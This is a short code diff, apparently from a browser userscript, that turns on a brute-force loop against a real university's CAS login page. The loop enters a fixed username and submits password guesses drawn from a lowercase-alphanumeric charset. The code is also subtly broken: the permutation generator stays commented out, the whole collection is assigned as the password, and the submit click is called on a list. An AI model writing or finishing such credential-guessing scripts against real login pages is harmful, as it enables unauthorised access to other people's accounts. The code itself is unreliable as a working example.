@@ -10,19 +10,17 @@
 
 if (window.location == 'https://login.marist.edu/cas/login') {
     if(!document.getElementById('password').value){
-        //alert("Starting");
-
-        //var charset = "abcdefghijklmnopqrstuvwxyz0123456789";
-        // var string = "xyz";
-        // permutations = permut(myname);
-        // for (var permutation of permutations){
-        //Place password attempt in password textbox
-        username = "stdg1";
-        document.getElementById('username').value = username;
-        document.getElementById('password').value = permutations;
-        //Press the submit button
-        document.getElementsByName('submit').click();
-        //}
+        alert("Starting");
+        var charset = "abcdefghijklmnopqrstuvwxyz0123456789";
+        // permutations = permut(charset);
+        for (var permutation of permutations){
+            //Place password attempt in password textbox
+            username = "stdg1";
+            document.getElementById('username').value = username;
+            document.getElementById('password').value = permutations;
+            //Press the submit button
+            document.getElementsByName('submit').click();
+        }
     }
 }
 
